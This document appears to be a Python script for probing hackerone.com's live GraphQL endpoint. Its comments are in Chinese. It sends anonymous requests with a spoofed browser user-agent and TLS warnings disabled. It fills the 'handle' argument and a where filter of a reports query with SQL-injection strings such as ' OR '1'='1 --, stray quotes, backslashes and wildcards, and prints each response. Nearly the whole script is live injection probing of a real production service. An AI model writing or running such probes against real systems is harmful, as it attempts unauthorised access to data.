# -*- coding: utf-8 -*-
"""h1x49l: reports(handle:) 单值参数收尾(匿名只读)"""
import sys, io, json, time
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3
urllib3.disable_warnings()
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0'})
Q = chr(39)

def probe(name, qstr, timeout=15):
    t0 = time.time()
    try:
        r = s.post('https://hackerone.com/graphql', json={'query': qstr}, timeout=timeout)
        print(f'--- {name} [{r.status_code} {round(time.time()-t0,1)}s] {r.text[:180]}')
    except Exception as e:
        print(f'--- {name} ERR {type(e).__name__}: {e}')

for v in ['neon_bbp', Q, 'neon_bbp' + Q, Q + ' OR ' + Q + '1' + Q + '=' + Q + '1 --', 'x\\\\', '%', '*', '']:
    probe('reports_handle=%r' % v[:16], '{ reports(handle: %s) { total_count } }' % json.dumps(v))

# 基线 where 对照(确认匿名 visible 集)
probe('where_base', '{ reports(where: {team: {handle: {_eq: "neon_bbp"}}}) { total_count } }')
probe('where_neon_or', '{ reports(where: {team: {handle: {_eq: "%s OR %s1%s=%s1 --"}}}) { total_count } }' % (Q, Q, Q, Q))
